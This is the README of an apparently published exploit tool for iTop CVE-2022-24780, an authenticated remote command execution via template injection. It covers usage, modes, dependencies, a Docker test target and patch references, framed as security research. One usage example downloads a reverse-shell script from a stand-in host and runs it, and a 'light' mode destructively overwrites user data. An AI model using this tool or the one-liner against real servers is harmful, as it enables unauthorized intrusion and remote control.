# iTop RCE via SSTI - CVE-2022-24780 exploit

> iTop < 2.7.6 - (Authenticated) Remote command execution

Exploit for [CVE-2022-24780][CVE-2022-24780].

[[EDB-TODO](https://www.exploit-db.com/exploits/TODO)] [[PacketStorm](https://packetstormsecurity.com/files/167236/iTop-Remote-Command-Execution.html)] [[WLB-2022050075](https://cxsecurity.com/issue/WLB-2022050075)]

## Usage

```
$ ruby exploit.rb -h
iTop < 2.7.6 - (Authenticated) Remote command execution

Usage:
  exploit.rb full <url> <username> <password> <cmd> [--debug]
  exploit.rb light <url> <username> <password> <cmd> [--debug]
  exploit.rb -h | --help

  full: exploit with an emulated browser, execute JavaScript, preserve original user profile information
  light: just parse HTML and send requests, no JavaScript, (DESTRUCTIVE) reset user information: phone, location, function

Options:
  <url>       Root URL (base path) including HTTP scheme, port and root folder
  <username>  iTop portal username
  <password>  iTop portal user password
  <cmd>       Command to execute on the target
  --debug     Display arguments
  -h, --help  Show this screen

Examples:
  exploit.rb full http://example.org john 's9nvEIZnEo6ghi' 'echo proof > /var/www/html/proof.txt'
  exploit.rb light https://example.org:5000/itop john 's9nvEIZnEo6ghi' 'curl --remote-name http://pentest.example.com:7000/revshell.pl; perl revshell.pl'
```

## Flavor

The **full** flavor of the exploit is using [Watir](http://watir.com/) using a web browser driven by [Selenium](https://www.selenium.dev/) to emulate a user browsing. This is required to preserve user information. The exploit inject an SSTI payload in a sub-part of the form used to modify user information on the portal user profile. While some values can be hardcoded or retrieved from the HTML others (phone, location, function) are loaded dynamically via Javascript and injected into the HTML. So in order for the exploit to not be destructive, it's necessary to execute JavaScript to be able to retrieve those values.

The **light** flavor of the exploit is not caring that much and will just destructively set a null value to some user information fields (phone, location, function) instead. However this flavor is faster to execute, requires less dependencies, won't execute any JavaScript, and doesn't need a X environment (Watir does to run the web browser).

## Requirements

**TL;DR**: install all `bundle install`

**Full** flavor

- [httpx](https://gitlab.com/honeyryderchuck/httpx)
- [docopt.rb](https://github.com/docopt/docopt.rb)
- [watir](https://github.com/watir/watir)
- [webdrivers](https://github.com/titusfortner/webdrivers)

Example using gem:

```bash
gem install httpx docopt watir webdrivers
```

**Light** flavor

- [httpx](https://gitlab.com/honeyryderchuck/httpx)
- [docopt.rb](https://github.com/docopt/docopt.rb)
- [Nokogiri](https://github.com/sparklemotion/nokogiri)

Example using gem:

```bash
gem install httpx docopt nokogiri
```

## Limitations

It is not recommended to use payloads with double quotes (`"`) nor backslashes (`\`) because the payload is injected into JSON.

## Docker deployment of the vulnerable software

**Warning**: this container is not suited for production usage!

Using `vbkunin/itop:2.7.4` - [source](https://github.com/vbkunin/itop-docker/tree/2.7.4) - [docker hub](https://hub.docker.com/layers/itop/vbkunin/itop/2.7.4/images/sha256-d2501b3a5f31a38c7a4edf9bddddb02bfc79542b7eceef5b6c6168ebba631048?context=explore)

```
$ docker run -d -p 8000:80 --name=itop-CVE-2022-24780 vbkunin/itop:2.7.4
```

## References

- Target software: **iTop**
  - Homepage: https://www.itophub.io/
  - Vendor: https://www.combodo.com/itop
  - Online demo: https://www.combodo.com/itop-access-to-the-demonstration
  - Source:
    - https://github.com/Combodo/iTop
    - https://sourceforge.net/projects/itop/files/itop/
  - Vulnerable version:
    - 2.x branch: < 2.7.6
    - 3.x branch: < 3.0.0 (eg. 3.0.0-beta-7312)
  - Patches:
    - https://github.com/Combodo/iTop/commit/b6fac4b411b8d145fc30fa35c66b51243eafd06b
    - https://github.com/Combodo/iTop/commit/eb2a615bd28100442c7f6171707bb40884af2305
    - https://github.com/Combodo/iTop/commit/93f273a28778e5da8e51096f021d2dc1adbf4ef3
  - Advisories:
    - https://www.opencve.io/cve/CVE-2022-24780
    - https://github.com/Combodo/iTop/security/advisories/GHSA-v97m-wgxq-rh54
    - https://attackerkb.com/topics/tcUqij2rjR/cve-2022-24780

The vulnerability was found by [Markus KRELL](https://markus-krell.de/).

Analysis of the vulnerability by the discoverer:

- [iTop â€“ Template Injection inside customer Portal](https://markus-krell.de/itop-template-injection-inside-customer-portal/)

## Disclaimer

ACCEIS does not promote or encourage any illegal activity, all content provided by this repository is meant for research, educational, and threat detection purpose only.

[CVE-2022-24780]:https://nvd.nist.gov/vuln/detail/CVE-2022-24780
